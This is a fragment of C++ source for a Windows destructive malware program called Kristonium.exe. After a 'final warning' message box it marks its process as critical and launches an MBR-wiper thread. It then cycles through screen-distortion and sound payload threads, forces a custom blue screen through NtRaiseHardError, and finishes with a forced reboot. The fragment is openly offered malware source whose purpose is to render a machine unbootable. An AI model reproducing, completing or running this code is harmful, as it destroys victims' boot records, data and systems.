		if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!!! Are you sure to continue? If you have read the previous message and have been infomed of the destructive consequences of this malware! KHVirusser, N17Pro3426 are not responsible for any damage! Don't run this destructive version on real PC (VM only). Choose 'Yes' to start destroying this unusable machine. Choose 'No' otherwise.", L"FINAL WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			Sleep(1000);
			HANDLE thread1 = CreateThread(0, 0, radius, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, spamkill, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, thing, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, shader2, 0, 0, 0);
			//HANDLE thread2dot2 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			//TerminateThread(thread2dot1, 0);
			//CloseHandle(thread2dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, thing2, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			//TerminateThread(thread3dot1, 0);
			//CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, gdi1, 0, 0, 0);
			//HANDLE thread4dot1 = CreateThread(0, 0, payload4, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, bounce, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			//TerminateThread(thread6dot1, 0);
			//CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, textout2, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			//TerminateThread(thread6dot1, 0);
			//CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, glitch, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader4, 0, 0, 0);
			//HANDLE thread10dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			//TerminateThread(thread6dot1, 0);
			//CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound11();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			//TerminateThread(thread11dot1, 0);
			//CloseHandle(thread11dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, shader6, 0, 0, 0);
			//HANDLE thread12dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
			sound12();
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			//TerminateThread(thread11dot1, 0);
			//CloseHandle(thread11dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader7, 0, 0, 0);
			//HANDLE thread12dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
			sound13();
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			//TerminateThread(thread8dot1, 0);
			//CloseHandle(thread8dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, mandelbrot, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			//HANDLE thread12dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
			sound14();
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			//TerminateThread(thread14dot1, 0);
			//CloseHandle(thread14dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, shader8, 0, 0, 0);
			//HANDLE thread12dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
			sound15();
			Sleep(30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			InvalidateRect(0, 0, 0);
			HANDLE thread16 = CreateThread(0, 0, shader9, 0, 0, 0);
			//HANDLE thread12dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
			sound16();
			Sleep(30000);
			TerminateThread(thread14dot1, 0);
			CloseHandle(thread14dot1);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			InvalidateRect(0, 0, 0);
			HANDLE thread17 = CreateThread(0, 0, shader10, 0, 0, 0);
			sound17();
			Sleep(30000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			InvalidateRect(0, 0, 0);
			HANDLE thread18 = CreateThread(0, 0, shader11, 0, 0, 0);
			sound18();
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			TerminateThread(thread8dot1, 0);
			CloseHandle(thread8dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread19 = CreateThread(0, 0, kirurg, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			HANDLE thread20 = CreateThread(0, 0, invcc, 0, 0, 0);
			sound19();
			Sleep(30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			InvalidateRect(0, 0, 0);
			HANDLE thread21 = CreateThread(0, 0, shader12, 0, 0, 0);
			sound20();
			Sleep(30000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			InvalidateRect(0, 0, 0);
			HANDLE thread22 = CreateThread(0, 0, bounce, 0, 0, 0);
			HANDLE thread22dot1 = CreateThread(0, 0, textout1, 0, 0, 0)
			HANDLE thread3dot2 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound21();
			Sleep(30000);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			InvalidateRect(0, 0, 0);
			HANDLE thread23 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread23dot1 = CreateThread(0, 0, textout2, 0, 0, 0);
			sound22();
			Sleep(30000);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			InvalidateRect(0, 0, 0);
			HANDLE thread24 = CreateThread(0, 0, bounce, 0, 0, 0);
			sound23();
			Sleep(30000);
			HANDLE thread24dot1 = CreateThread(0, 0, kirurg, 0, 0, 0);
			Sleep(30000);
			//HANDLE finale = CreateThread(0, 0, last, 0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			ULONG_PTR args[] = { (ULONG_PTR)"The end! Your computer is destroyed by Kristonium.exe!" }; //The Custom BSOD!
			NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
			// If the computer is still running, do it the normal way.
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
}
